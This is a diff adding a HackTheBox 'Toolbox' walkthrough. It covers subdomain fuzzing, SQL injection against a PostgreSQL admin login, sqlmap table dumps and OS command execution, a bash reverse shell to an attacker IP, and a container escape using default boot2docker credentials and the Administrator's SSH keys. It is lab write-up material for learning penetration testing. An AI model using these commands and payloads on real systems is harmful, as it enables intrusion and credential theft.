@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/toolbox.png
-tags: ["HTB"]
+tags: ["HTB", "docker-toolbox", "ffuf", "sqli", "postgresql", "sqlmap", "docker", "container"]
 ---
 
 # Toolbox
@@ -62,3 +62,123 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 25.49 seconds
 
 ```
+- Web server
+  - There is also a certificate for `admin.megalogistic.com`
+
+![](./images/1.png)
+![](./images/2.png)
+
+- `ffuf`
+```
+└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.10.10.236 -H "Host: FUZZ.megalogistic.com" -k -fs 22357 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://10.10.10.236
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.megalogistic.com
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 22357
+________________________________________________
+
+[Status: 200, Size: 889, Words: 134, Lines: 36, Duration: 124ms]
+```
+
+- `admin.megalogistic.com`
+
+![](./images/3.png)
+
+- `ftp`
+
+![](./images/4.png)
+
+- `smb`
+
+![](./images/5.png)
+
+## Foothold/User
+- So the only option is to check `admin` panel
+  - I went through possible [entry point payloads](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+  - We have an error indicating that the backend database is `postgresql`
+
+![](./images/6.png)
+
+- Since we know the database, we can test bypass login payloads from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)
+  - I went with the following payload `' or 1=1 --`
+
+![](./images/7.png)
+
+- But found nothing
+  - So I ran `sqlmap` by saving request file from `Burp`
+  - `sqlmap -r admin.megalogistic --force-ssl --batch --dbs` to list databases
+  - `sqlmap -r admin.megalogistic --force-ssl --batch -D public --tables` to dump tables from `public` database
+  - `sqlmap -r admin.megalogistic --force-ssl --batch -D public -T users --dump` to dump `users` table
+  - Retrieved admin's hash `4a100a85cb5ca3616dcf137918550815` - but failed to crack it
+
+![](./images/8.png)
+![](./images/9.png)
+![](./images/10.png)
+
+- Let's try executing commands
+  - `sqlmap -r admin.megalogistic --force-ssl --batch --os-cmd whoami`
+  - And it works
+
+![](./images/11.png)
+
+- Let's get reverse shell
+  - Spawn interactive shell to send a payload `sqlmap -r admin.megalogistic --force-ssl --batch  --os-shell`
+  - Payload: `bash -c "bash -i >& /dev/tcp/10.10.16.12/6666 0>&1"` 
+
+![](./images/12.png)
+![](./images/13.png)
+
+- The flag can be found in `/var/lib/postgresql` folder
+
+## Root
+- Currently we're in the container and need to escape it
+  - Enumeration of the container revealed nothing
+  - We might need to check the `exe` file found in `ftp`
+  - We saw `Docker Toolbox`
+  - Found [boot2docker](https://github.com/boot2docker/boot2docker#ssh-into-vm)
+  - Apparently we can `ssh` to VM using following credentials `docker:tcuser`
+  - If we check `ifconfig`, we have `172.17.0.2` so VM is probably `.1`
+
+![](./images/14.png)
+![](./images/15.png)
+
+- We have `sudo` rights
+
+![](./images/16.png)
+
+- If we check the `/etc/*release`
+  - It is indeed `boot2docker`
+
+![](./images/17.png)
+
+- Let's continue checking directories
+  - We have `c` folder in the `/` path
+  - If we check it, we see `Users`
+  - If we continue following the path, we have an access to `Administrator`'s directory
+  - So `Users` is probably mounted to `c`
+
+![](./images/18.png)
+![](./images/19.png)
+
+- If we check `Administrator`'s directory we find `.ssh` folder which contains his keys
+  - Let's copy them and connect
+
+![](./images/20.png)
+![](./images/21.png)
